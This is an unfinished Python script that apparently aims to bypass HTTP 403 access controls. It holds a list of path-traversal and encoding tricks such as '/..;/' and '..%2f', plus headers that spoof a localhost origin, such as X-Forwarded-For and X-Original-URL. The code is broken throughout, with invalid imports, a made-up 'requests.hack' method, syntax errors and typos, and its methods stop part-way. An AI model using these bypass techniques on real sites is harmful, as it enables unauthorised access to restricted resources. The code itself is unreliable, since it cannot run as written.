
#####################################################
#                                                   #                    
#  coded by : @yogorta/4m4z1gh                      #
#                                                   #
#####################################################
from requests import requests
import sys
import os
import Thread
import parse


class Bypass403(Exception):
    def __init__(self):
        self.url = None
        self.path = None

        self.delimiters = [ "/","/*","/%2f/","/./",
                            "./.","/*/","?","??","&",
                            "#","%","%20","%09","/..;/",
                            "../","..%2f","..;/",".././",
                            "..%00/","..%0d","..%5c","..%ff/",
                            "%2e%2e%2f",".%2e/","%3f","%26",
                            "%23",".json"
                        ]
        
        self.requestObjs={  'get':      requests.get, 
                            'post':     requests.post, 
                            'head':     requests.head, 
                            'hack':     requests.hack, 
                            'put':      requests.put, 
                            'options':  requests.options, 
                            'connect':  requests.connect,
                            'patch':    requests.patch,
                            'delete':   requests.delete
                        }
        
        self.headers = {
            'X-Originating-IP'  : '127.0.0.1',
            'X-Forwarded-For'   : '127.0.0.1',
            'X-Forwarded'       : '127.0.0.1',
            'Forwarded-For'     : '127.0.0.1',
            'X-Remote-IP'       : '127.0.0.1',
            'X-Remote-Addr'     : '127.0.0.1',
            'X-ProxyUser-Ip'    : '127.0.0.1',
            'X-Original-URL'    : '127.0.0.1',
            'Client-IP'         : '127.0.0.1',
            'True-Client-IP'    : '127.0.0.1',
            'Cluster-Client-IP' : '127.0.0.1',
            'X-ProxyUser-Ip'    : '127.0.0.1',
            'Host'              : 'localhost',
            'X-Original-URL'    : 'PATH',
            'X-Rewrite-URL'     : 'PATH'
        }
        
        def print(self. data:str)->void:
            sys.stdout.flush()
            sys.dtdout.write(f"\r\r{data}")
            time.sleep(.001)

        def getResponse(self, reqObj, url, headers=[]):
            resonse = requests.
        def attack(self):
            for requestObj in self.requesObjs.itemes():
                
            